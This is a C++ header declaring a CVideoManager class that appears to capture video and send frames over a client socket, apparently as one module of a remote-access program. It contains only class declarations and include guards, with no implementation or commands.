// VideoManager.h: interface for the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_VIDEOMANAGER_H__0938E9CF_6A79_4C5A_A83C_DC1158ED04C3__INCLUDED_)
#define AFX_VIDEOMANAGER_H__0938E9CF_6A79_4C5A_A83C_DC1158ED04C3__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "VideoCap.h"
#include "VideoCodec.h"
#include "CaptureVideo.h"

class CVideoManager : public CManager  
{
public:
	CVideoManager(CClientSocket *pClient);
	virtual ~CVideoManager();

	bool m_bIsWorking;

	bool CVideoManager::Initialize();
	HANDLE m_hWorkThread;
	CVideoCodec	*m_pVideoCodec;
	CVideoCap	*m_pVideoCap;
	CCaptureVideo  m_CapVideo;
	DWORD	m_fccHandler;
	bool m_bIsCompress;
	static DWORD WINAPI WorkThread(LPVOID lparam);
	void CVideoManager::sendBITMAPINFO();
	void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize);
	void CVideoManager::sendNextScreen();
	void CVideoManager::Destroy();
};

#endif // !defined(AFX_VIDEOMANAGER_H__0938E9CF_6A79_4C5A_A83C_DC1158ED04C3__INCLUDED_)
